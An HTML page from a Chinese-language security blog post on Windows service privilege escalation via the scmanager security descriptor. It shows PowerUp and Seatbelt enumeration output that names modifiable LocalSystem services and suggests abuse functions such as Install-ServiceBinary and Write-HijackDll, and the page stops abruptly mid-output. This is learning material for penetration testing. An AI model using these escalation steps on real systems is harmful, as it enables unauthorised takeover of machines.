@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Skills Issue 指的是關於我在一些技能上出現的問題，也就是所謂的技能問題。 雖然本不該出現在博客上，但由於這是我的博客，個人博客又不需要這麽權威，所以隨便記錄一下。 前言與工具的枚舉這次是關於服務的提權，在這個系統中有一個服務的提權漏洞，是關於 scmanager​ 的 Security Descriptor 問題。 在 winpeas 中，如果直接枚舉service，你會看不到可以魔改">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Skills Issue - 有關 scmanager 的權限">
+<meta property="og:url" content="https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Skills Issue 指的是關於我在一些技能上出現的問題，也就是所謂的技能問題。 雖然本不該出現在博客上，但由於這是我的博客，個人博客又不需要這麽權威，所以隨便記錄一下。 前言與工具的枚舉這次是關於服務的提權，在這個系統中有一個服務的提權漏洞，是關於 scmanager​ 的 Security Descriptor 問題。 在 winpeas 中，如果直接枚舉service，你會看不到可以魔改">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403163348-uji5y13.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403161817-ljswyh4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403162119-grfre1e.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403164856-v5hac2r.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403170532-725i4v5.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403165327-07rs40e.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403171618-ghrk9ka.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403172517-46i0zyf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403172704-djzt6nl.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403173915-p8vfmqr.png">
+<meta property="article:published_time" content="2025-04-04T08:12:00.000Z">
+<meta property="article:modified_time" content="2025-04-04T08:20:39.807Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403163348-uji5y13.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Skills Issue - 有關 scmanager 的權限</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/30/2025/30-hackthebox-Haze/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&text=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&title=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&is_video=false&description=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Skills Issue - 有關 scmanager 的權限&body=Check out this article: https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&title=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&title=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&title=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&title=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&name=Skills Issue - 有關 scmanager 的權限&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&t=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Skills Issue - 有關 scmanager 的權限
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-04T08:12:00.000Z" class="dt-published" itemprop="datePublished">2025-04-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Skills Issue 指的是關於我在一些技能上出現的問題，也就是所謂的<strong>技能問題</strong>。</p>
+<p>雖然本不該出現在博客上，但由於這是我的博客，個人博客又不需要這麽權威，所以<strong>隨便記錄</strong>一下。</p>
+<h1 id="前言與工具的枚舉"><a href="#前言與工具的枚舉" class="headerlink" title="前言與工具的枚舉"></a>前言與工具的枚舉</h1><p>這次是關於服務的提權，在這個系統中有一個服務的提權漏洞，是關於 <code>scmanager</code>​ 的 Security Descriptor 問題。</p>
+<p>在 winpeas 中，如果直接枚舉service，你會看不到可以魔改任何服務的地方：</p>
+<p><img src="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403163348-uji5y13.png" alt="image"></p>
+<p>如果使用 <code>PowerUP</code>​ 的話：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">PS C:\mane&gt; Invoke-PrivescAudit</span><br><span class="line">Invoke-PrivescAudit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ServiceName                     : gupdate</span><br><span class="line">Path                            : <span class="string">&quot;C:\Program Files (x86)\Google\Update\GoogleUpdate.exe&quot;</span> /svc</span><br><span class="line">ModifiableFile                  : C:\</span><br><span class="line">ModifiableFilePermissions       : AppendData/AddSubdirectory</span><br><span class="line">ModifiableFileIdentityReference : BUILTIN\Users</span><br><span class="line">StartName                       : LocalSystem</span><br><span class="line">AbuseFunction                   : Install-ServiceBinary -Name <span class="string">&#x27;gupdate&#x27;</span></span><br><span class="line">CanRestart                      : <span class="literal">False</span></span><br><span class="line">Name                            : gupdate</span><br><span class="line">Check                           : Modifiable Service Files</span><br><span class="line"></span><br><span class="line">ServiceName                     : gupdate</span><br><span class="line">Path                            : <span class="string">&quot;C:\Program Files (x86)\Google\Update\GoogleUpdate.exe&quot;</span> /svc</span><br><span class="line">ModifiableFile                  : C:\</span><br><span class="line">ModifiableFilePermissions       : WriteData/AddFile</span><br><span class="line">ModifiableFileIdentityReference : BUILTIN\Users</span><br><span class="line">StartName                       : LocalSystem</span><br><span class="line">AbuseFunction                   : Install-ServiceBinary -Name <span class="string">&#x27;gupdate&#x27;</span></span><br><span class="line">CanRestart                      : <span class="literal">False</span></span><br><span class="line">Name                            : gupdate</span><br><span class="line">Check                           : Modifiable Service Files</span><br><span class="line"></span><br><span class="line">ServiceName                     : gupdatem</span><br><span class="line">Path                            : <span class="string">&quot;C:\Program Files (x86)\Google\Update\GoogleUpdate.exe&quot;</span> /medsvc</span><br><span class="line">ModifiableFile                  : C:\</span><br><span class="line">ModifiableFilePermissions       : AppendData/AddSubdirectory</span><br><span class="line">ModifiableFileIdentityReference : BUILTIN\Users</span><br><span class="line">StartName                       : LocalSystem</span><br><span class="line">AbuseFunction                   : Install-ServiceBinary -Name <span class="string">&#x27;gupdatem&#x27;</span></span><br><span class="line">CanRestart                      : <span class="literal">False</span></span><br><span class="line">Name                            : gupdatem</span><br><span class="line">Check                           : Modifiable Service Files</span><br><span class="line"></span><br><span class="line">ServiceName                     : gupdatem</span><br><span class="line">Path                            : <span class="string">&quot;C:\Program Files (x86)\Google\Update\GoogleUpdate.exe&quot;</span> /medsvc</span><br><span class="line">ModifiableFile                  : C:\</span><br><span class="line">ModifiableFilePermissions       : WriteData/AddFile</span><br><span class="line">ModifiableFileIdentityReference : BUILTIN\Users</span><br><span class="line">StartName                       : LocalSystem</span><br><span class="line">AbuseFunction                   : Install-ServiceBinary -Name <span class="string">&#x27;gupdatem&#x27;</span></span><br><span class="line">CanRestart                      : <span class="literal">False</span></span><br><span class="line">Name                            : gupdatem</span><br><span class="line">Check                           : Modifiable Service Files</span><br><span class="line"></span><br><span class="line">ServiceName                     : winlogbeat</span><br><span class="line">Path                            : <span class="string">&quot;C:\Program Files\Winlogbeat\winlogbeat.exe&quot;</span> -c <span class="string">&quot;C:\Program</span></span><br><span class="line"><span class="string">                                  Files\Winlogbeat\winlogbeat.yml&quot;</span> -path.home <span class="string">&quot;C:\Program Files\Winlogbeat&quot;</span> -path.data</span><br><span class="line">                                  <span class="string">&quot;C:\ProgramData\winlogbeat&quot;</span> -path.logs <span class="string">&quot;C:\ProgramData\winlogbeat\logs&quot;</span> -E</span><br><span class="line">                                  logging.files.redirect_stderr=true</span><br><span class="line">ModifiableFile                  : C:\ProgramData\winlogbeat</span><br><span class="line">ModifiableFilePermissions       : &#123;WriteAttributes, AppendData/AddSubdirectory, WriteExtendedAttributes,</span><br><span class="line">                                  WriteData/AddFile&#125;</span><br><span class="line">ModifiableFileIdentityReference : BUILTIN\Users</span><br><span class="line">StartName                       : LocalSystem</span><br><span class="line">AbuseFunction                   : Install-ServiceBinary -Name <span class="string">&#x27;winlogbeat&#x27;</span></span><br><span class="line">CanRestart                      : <span class="literal">False</span></span><br><span class="line">Name                            : winlogbeat</span><br><span class="line">Check                           : Modifiable Service Files</span><br><span class="line"></span><br><span class="line">ServiceName                     : winlogbeat</span><br><span class="line">Path                            : <span class="string">&quot;C:\Program Files\Winlogbeat\winlogbeat.exe&quot;</span> -c <span class="string">&quot;C:\Program</span></span><br><span class="line"><span class="string">                                  Files\Winlogbeat\winlogbeat.yml&quot;</span> -path.home <span class="string">&quot;C:\Program Files\Winlogbeat&quot;</span> -path.data</span><br><span class="line">                                  <span class="string">&quot;C:\ProgramData\winlogbeat&quot;</span> -path.logs <span class="string">&quot;C:\ProgramData\winlogbeat\logs&quot;</span> -E</span><br><span class="line">                                  logging.files.redirect_stderr=true</span><br><span class="line">ModifiableFile                  : C:\ProgramData\winlogbeat\logs</span><br><span class="line">ModifiableFilePermissions       : &#123;WriteAttributes, AppendData/AddSubdirectory, WriteExtendedAttributes,</span><br><span class="line">                                  WriteData/AddFile&#125;</span><br><span class="line">ModifiableFileIdentityReference : BUILTIN\Users</span><br><span class="line">StartName                       : LocalSystem</span><br><span class="line">AbuseFunction                   : Install-ServiceBinary -Name <span class="string">&#x27;winlogbeat&#x27;</span></span><br><span class="line">CanRestart                      : <span class="literal">False</span></span><br><span class="line">Name                            : winlogbeat</span><br><span class="line">Check                           : Modifiable Service Files</span><br><span class="line"></span><br><span class="line">ModifiablePath    : C:\Users\mane\AppData\Local\Microsoft\WindowsApps</span><br><span class="line">IdentityReference : IT\ITEmployee30</span><br><span class="line">Permissions       : &#123;WriteOwner, Delete, WriteAttributes, Synchronize...&#125;</span><br><span class="line">%PATH%            : C:\Users\mane\AppData\Local\Microsoft\WindowsApps</span><br><span class="line">Name              : C:\Users\mane\AppData\Local\Microsoft\WindowsApps</span><br><span class="line">Check             : %PATH% .dll Hijacks</span><br><span class="line">AbuseFunction     : Write-HijackDll -DllPath <span class="string">&#x27;C:\Users\mane\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>從結果中你可以看到在 PowerUP 的脚本中沒有提起任何關於 <code>scmanager</code>​ 的 Security Descriptor 的問題。</p>
+<p>如果使用 <code>Seatbelt</code>​ 呢？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">PS C:\mane&gt; .\Seatbelt.exe Services</span><br><span class="line">[!] Ams1 Sleep by @manesec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        %&amp;&amp;@@@&amp;&amp;</span><br><span class="line">                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%,                       <span class="comment">#&amp;&amp;@@@@@@%%%%%%###############%</span></span><br><span class="line">                        &amp;%&amp;   %&amp;%%                        &amp;////(((&amp;%%%%%<span class="comment">#%################//((((###%%%%%%%%%%%%%%%</span></span><br><span class="line">%%%%%%%%%%%<span class="comment">######%%%#%%####%  &amp;%%**#                      @////(((&amp;%%%%%%######################(((((((((((((((((((</span></span><br><span class="line"><span class="comment">#%#%%%%%%%#######%#%%#######  %&amp;%,,,,,,,,,,,,,,,,         @////(((&amp;%%%%%#%#####################(((((((((((((((((((</span></span><br><span class="line"><span class="comment">#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&amp;%%%%%%%######################(#(((#(#((((((((((</span></span><br><span class="line"><span class="comment">#####%%%####################  &amp;%%......  ...   ..         @////(((&amp;%%%%%%%###############%######((#(#(####((((((((</span></span><br><span class="line"><span class="comment">#######%##########%#########  %%%......  ...   ..         @////(((&amp;%%%%%#########################(#(#######((#####</span></span><br><span class="line"><span class="comment">###%##%%####################  &amp;%%...............          @////(((&amp;%%%%%%%%##############%#######(#########((#####</span></span><br><span class="line"><span class="comment">#####%######################  %%%..                       @////(((&amp;%%%%%%%################</span></span><br><span class="line">                        &amp;%&amp;   %%%%%      Seatbelt         %////(((&amp;%%%%%%%%<span class="comment">#############*</span></span><br><span class="line">                        &amp;%%&amp;&amp;&amp;%%%%%        v1<span class="number">.2</span><span class="number">.2</span>         ,(((&amp;%%%%%%%%%%%%%%%%%,</span><br><span class="line">                         <span class="comment">#%%%%##,</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">====== Services ======</span><br><span class="line"></span><br><span class="line">Non Microsoft Services (via WMI)</span><br><span class="line"></span><br><span class="line">  Name                           : GoogleChromeElevationService</span><br><span class="line">  DisplayName                    : Google Chrome Elevation Service (GoogleChromeElevationService)</span><br><span class="line">  Description                    :</span><br><span class="line">  User                           : LocalSystem</span><br><span class="line">  State                          : Stopped</span><br><span class="line">  StartMode                      : Manual</span><br><span class="line">  <span class="type">Type</span>                           : Own Process</span><br><span class="line">  ServiceCommand                 : <span class="string">&quot;C:\Program Files (x86)\Google\Chrome\Application\121.0.6167.184\elevation_service.exe&quot;</span></span><br><span class="line">  BinaryPath                     : C:\Program Files (x86)\Google\Chrome\Application\<span class="number">121.0</span><span class="number">.6167</span><span class="number">.184</span>\elevation_service.exe</span><br><span class="line">  BinaryPathSDDL                 : O:SYD:AI(A;ID;<span class="number">0x1200a9</span>;;;S-<span class="number">1</span>-<span class="number">15</span>-<span class="number">3</span>-<span class="number">1024</span>-<span class="number">3424233489</span>-<span class="number">972189580</span>-<span class="number">2057154623</span>-<span class="number">747635277</span>-<span class="number">1604371224</span>-<span class="number">316187997</span>-<span class="number">3786583170</span>-<span class="number">1043257646</span>)(A;ID;<span class="number">0x1200a9</span>;;;S-<span class="number">1</span>-<span class="number">15</span>-<span class="number">3</span>-<span class="number">1024</span>-<span class="number">2302894289</span>-<span class="number">466761758</span>-<span class="number">1166120688</span>-<span class="number">1039016420</span>-<span class="number">2430351297</span>-<span class="number">4240214049</span>-<span class="number">4028510897</span>-<span class="number">3317428798</span>)(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;<span class="number">0x1200a9</span>;;;BU)(A;ID;<span class="number">0x1200a9</span>;;;AC)(A;ID;<span class="number">0x1200a9</span>;;;S-<span class="number">1</span>-<span class="number">15</span>-<span class="number">2</span>-<span class="number">2</span>)</span><br><span class="line">  ServiceDll                     :</span><br><span class="line">  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)</span><br><span class="line">  CompanyName                    : Google LLC</span><br><span class="line">  FileDescription                : Google Chrome</span><br><span class="line">  Version                        : <span class="number">121.0</span><span class="number">.6167</span><span class="number">.184</span></span><br><span class="line">  IsDotNet                       : <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  Name                           : gupdate</span><br><span class="line">  DisplayName                    : Google Update Service (gupdate)</span><br><span class="line">  Description                    : Keeps your Google software up to date. If this service <span class="keyword">is</span> disabled <span class="keyword">or</span> stopped, your Google software will <span class="keyword">not</span> be kept up to date, meaning security vulnerabilities that may arise cannot be fixed <span class="keyword">and</span> features may <span class="keyword">not</span> work. This service uninstalls itself when there <span class="keyword">is</span> no Google software using it.</span><br><span class="line">  User                           : LocalSystem</span><br><span class="line">  State                          : Stopped</span><br><span class="line">  StartMode                      : Auto</span><br><span class="line">  <span class="type">Type</span>                           : Own Process</span><br><span class="line">  ServiceCommand                 : <span 